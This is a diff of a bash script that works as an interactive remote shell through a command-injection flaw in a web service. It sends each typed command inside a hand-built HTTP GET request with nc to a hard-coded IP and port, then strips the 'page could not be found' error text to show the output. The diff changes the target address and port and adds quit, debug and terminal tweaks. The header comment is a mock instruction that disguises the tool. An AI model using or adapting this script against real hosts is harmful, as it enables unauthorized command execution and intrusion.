@@ -7,9 +7,9 @@
 # 4. Run as fast as you can with your rooter o mobile phone.  The internet connection is now faster.
 
 # Config section
-HOST=157.245.33.77
+HOST=157.245.32.36
 PAGE="/"
-PORT=31124
+PORT=30398
 PROMPT="boom@$HOST$"
 
 echo -n "$PROMPT "
@@ -18,12 +18,18 @@ read CMD
 while [ true ];
 do
 
-	#if [ $1 == "quit" ];
-	#then
-	#  exit
-	#fi
+	if [[ $CMD = "quit" ]]; then
+		exit
+	fi
+
+        #CMD="export TERM=linux; alias ls='ls --color=always'; $CMD"
+        CMD="export TERM=linux; $CMD"
+
 
 	CMD=`echo $CMD | sed -e "s/ /%20/g"`
+	CMD=`echo $CMD | sed -e "s/ls/ls%20--color=always/g"`
+        
+        
 	#echo "COMANDO $CMD"
 
 	method='GET '
@@ -47,11 +53,14 @@ do
 
 	request="$request0$request1$request2$request3$request4$request5$request6$request7$request8$request9$request10$request11"
 
-	#echo -e $request
-	echo -e $request | nc $HOST $PORT |\
-	
+	if [[ $1 == '-debug' ]]; then
+		echo -e $request
+        fi
+
+	echo -e $request | nc $HOST $PORT 2>&1|\
+
 	 # Removing unwanted output
-	 grep -A100 "The page" | tr "'" ' ' | sed -e 's/<p>The page  <str>//g' |\
+	 egrep -A100 "The page" | tr "'" ' ' | sed -e 's/<p>The page  <str>//g' |\
 	 sed -e 's/<\/str>  could not be found<\/p>//g'
 
 	echo -n "$PROMPT "
